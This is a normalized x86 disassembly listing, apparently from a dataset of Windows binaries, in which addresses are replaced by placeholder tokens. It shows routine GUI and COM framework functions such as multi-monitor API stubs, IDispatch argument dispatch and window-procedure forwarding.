cmp [ ebp + 0x10 ] eax
je r-xdata
call sub_40a7dd
push eax
push 0x7
mov ecx ebx
call sub_40c2eb
mov eax [ ebp + 0xc ]
mov [ esi + 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x5c ] eax
mov [ esi + 0x54 ] edi
mov eax esi
call sub_415c98
retn 0x14
sub_40dade
push 0x8
mov eax sub_425c77
call sub_415bf3
mov esi ecx
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push edi
lea ecx [ esi + 0x1c ]
call sub_40c3cf
test eax eax
jne r-xdata
xor eax eax
call sub_415c98
retn 0x4
lea ecx [ esi + 0x38 ]
push edi
call sub_40c3cf
test eax eax
je r-xdata
push sub_412d66
call sub_40a5b5
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
call sub_41321d
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x58 ]
add ecx eax
mov [ ecx ] edi
cmp [ esi + 0x5c ] 0x2
jne r-xdata
push ebx
call [ esi + 0x14 ]
push edi
lea ecx [ esi + 0x38 ]
call sub_40c596
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_40a5b5
mov eax [ esi + 0x58 ]
add eax ebx
mov [ eax ] edi
cmp [ esi + 0x5c ] 0x2
jne r-xdata
call sub_40a7a5
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_40db91
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x44 ]
neg eax
sbb eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x38 ]
call sub_40c349
lea ecx [ esi + 0x4 ]
call sub_413201
push edi
lea edi [ esi + 0x38 ]
push [ ebp - 0x4 ]
call [ esi + 0x18 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
and [ eax + 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_40c485
mov eax [ esi + 0x58 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x5c ] 0x2
jne r-xdata
pop edi
sub_40dbf6
push 0x4
mov eax sub_425c5c
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_40db91
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_40c53b
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x0
call sub_40c53b
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call j_sub_413201
call sub_415c98
retn
sub_40dc43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40dbf6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_40dc64
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x90
lea eax [ ebp - 0x94 ]
push 0x0
push eax
call sub_415f60
add esp 0xc
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x88 ] 0x2
sete al
xor ecx ebp
call sub_414a33
leave
retn
sub_40dcbe
mov edi edi
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push esi
push edi
call sub_40dc64
push r--data
mov [ rw-data ] eax
call [ GetModuleHandleW@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
pop ebx
setne al
retn
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push r--data
push r--data
jmp r-xdata
xor eax eax
inc eax
push edi
call esi
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
sub_40ddc8
mov edi edi
push ebp
mov ebp esp
call sub_40dcbe
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
push esi
push edi
jne r-xdata
pop ebp
jmp [ rw-data ]
mov eax 0x12340042
mov esi [ ebp + 0x8 ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_40de19
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
call sub_40dcbe
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40ddc8
jmp r-xdata
test eax eax
je r-xdata
sub_40de86
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
call sub_40dcbe
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
push ebx
jne r-xdata
mov esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call [ rw-data ]
mov edi eax
xor ecx ecx
cmp edi ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] ecx
jne r-xdata
cmp [ ebx ] 0x28
jb r-xdata
pop edi
pop esi
leave
retn 0x8
cmp [ esi ] 0x68
jb r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push 0x20
lea eax [ esi + 0x28 ]
push eax
push 0xffffffff
push eax
push ecx
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor esi esi
inc esi
cmp [ ebx ] 0x68
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
jb r-xdata
mov eax esi
jmp r-xdata
push 0x20
add ebx 0x28
push ebx
push 0xffffffff
push r--data
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
pop ebx
sub_40df4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
xor edx edx
push esi
push edi
mov [ ebp - 0x20 ] ax
cmp ebx edx
jne r-xdata
mov edi [ ebp + 0x1c ]
cmp edi edx
jne r-xdata
mov eax 0x80070057
jmp r-xdata
mov ecx [ edi + 0x8 ]
cmp ecx 0x5
jbe r-xdata
mov eax 0x80020008
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x24
mov [ ebp + 0x8 ] edx
cmp [ edi + 0xc ] edx
jbe r-xdata
mov eax 0x8002000e
jmp r-xdata
cmp [ ebp + 0x8 ] ecx
jae r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp + 0x1c ] eax
cmp [ ebp + 0x28 ] 0x0
mov esi 0x80020003
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx ecx
sub edx [ ebp + 0x8 ]
shl eax 0x4
add eax [ edi ]
sub ecx [ ebp + 0x8 ]
lea edx [ ebp + edx * 4 - 0x48 ]
mov esi [ edi ]
add [ ebp + 0x1c ] 0x4
add esi edx
inc [ ebp + 0x8 ]
mov [ ebp + eax * 4 - 0x44 ] esi
mov eax [ ebp + 0x8 ]
add edx 0x10
cmp eax [ edi + 0xc ]
jb r-xdata
cmp [ ebp + 0x20 ] 0x0
jne r-xdata
lea eax [ ebp + 0x18 ]
mov [ ebp + 0x28 ] eax
mov [ edx ] eax
add eax 0x10
sub edx 0x4
dec ecx
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
cmp eax ecx
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ VariantInit@IAT ]
mov eax [ ebp + 0xc ]
add eax 0x139a
cmp eax 0x12
ja r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp + 0x20 ] eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantClear@IAT ]
mov eax esi
mov cl [ ebp + 0x18 ]
push 0x2
pop edx
jmp [ eax * 4 + jump_table_40e4cc ]
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x5
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
push [ ebp + 0x20 ]
mov eax [ ebx ]
push ebx
call [ eax + 0x4c ]
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebx ]
push ebx
call [ eax + 0x48 ]
jmp r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test dl cl
je r-xdata
test dl cl
je r-xdata
cmp [ edi + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp + 0x20 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
push ebx
call [ eax + 0x20 ]
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
push ebx
call [ eax + 0x1c ]
mov esi 0x8002000e
jmp r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
mov edi [ VariantChangeType@IAT ]
je r-xdata
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
je r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x10 ]
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
je r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x50 ]
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x44 ]
jmp r-xdata
mov esi [ ebp - 0x44 ]
movzx eax [ esi ]
test eax 0x4000
je r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x3c ]
jmp r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x38 ]
jmp r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x34 ]
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x30 ]
jmp r-xdata
test cl 0x4
je r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test cl 0x4
je r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x24 ]
jmp r-xdata
mov esi eax
test esi esi
jl r-xdata
push 0x9
mov eax [ eax + 0x8 ]
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x3
je r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call edi
mov esi eax
test esi esi
jl r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov ecx [ ebp + 0x28 ]
and [ ecx ] 0x0
mov esi [ ebp - 0x34 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
push [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
push [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
push [ ebp - 0xc ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
jmp r-xdata
test cl 0xf
je r-xdata
mov esi [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
push 0x8
jmp r-xdata
mov esi eax
test esi esi
jl r-xdata
mov ecx 0x400c
cmp ax cx
jne r-xdata
test al 0xc
jne r-xdata
cmp [ edi + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x2c ]
jmp r-xdata
cmp [ edi + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x28 ]
jmp r-xdata
mov esi eax
test esi esi
jl r-xdata
push 0x3
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
push [ ebp + 0x18 ]
push ebx
call [ ecx + 0x60 ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call edi
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp + 0x28 ]
and [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
test cl 0xc
je r-xdata
lea eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x20 ]
pop eax
mov [ ecx ] ax
mov ecx 0x4008
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
call [ VariantClear@IAT ]
mov eax [ esi + 0x8 ]
push 0x8
pop ecx
mov [ eax ] cx
mov eax [ esi + 0x8 ]
add eax ecx
jmp r-xdata
mov esi 0x80020005
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x8
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x8
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je r-xdata
mov eax [ ebp + 0x28 ]
mov [ eax ] 0x1
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call [ VariantClear@IAT ]
mov eax [ esi + 0x8 ]
push 0x3
pop ecx
mov [ eax ] cx
mov eax [ esi + 0x8 ]
add eax 0x8
jmp r-xdata
push esi
call [ VariantClear@IAT ]
push 0x8
pop ecx
lea eax [ esi + 0x8 ]
mov [ esi ] cx
mov eax [ esi + 0x8 ]
jmp r-xdata
mov edx [ ebp + 0x20 ]
mov esi [ ebp - 0x40 ]
mov ecx [ ebx ]
add edx 0x8
push edx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x6c ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x68 ]
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jge r-xdata
movzx ecx [ esi ]
test ecx 0x4000
je r-xdata
lea eax [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
sub_40e518
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
lea edi [ eax + ebx * 4 ]
xor esi esi
add esi 0x4
cmp esi 0x4c
jb r-xdata
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x1 ] 0x1
mov [ ecx + ebx * 4 ] eax
push [ esi + rw-data ]
push [ edi ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax 0x80020006
jmp r-xdata
inc ebx
cmp ebx [ ebp + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_40e57a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40d6f1
mov eax [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x20 ] eax
xor eax eax
mov [ esi + 0x24 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40e5e6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
push eax
call [ CallWindowProcW@IAT ]
mov eax [ esi ]
call [ eax + 0xf8 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call [ DefWindowProcW@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40e633
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40bc2a
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call eax
sub_40e654
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x20 ]
call sub_412db9
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
jmp r-xdata
cmp [ esi ] 0x2c
jb r-xdata
pop edi
pop ebx
leave
retn 0xc
mov eax [ ebx + 0x20 ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageW@IAT ]
test eax 0x2000
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_40e6c7
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_40e709
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x114 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x118 ]
mov [ ebp - 0x4 ] eax
sub_40e780
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_412b90
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_412b76
push eax
push [ ebp + 0x8 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
pop ebp
retn 0x8
and eax 0xfffffdff
sub_40e875
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x24 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e89a
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e8bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x2c ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e8e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e909
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x34 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e92e
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x38 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e953
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e978
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
push edi
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0x8 ]
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
pop edi
pop esi
pop ebp
retn 0x18
sub_40e9a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
lea esi [ ebp + 0x8 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
pop edi
pop esi
pop ebp
retn 0x14
sub_40e9ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
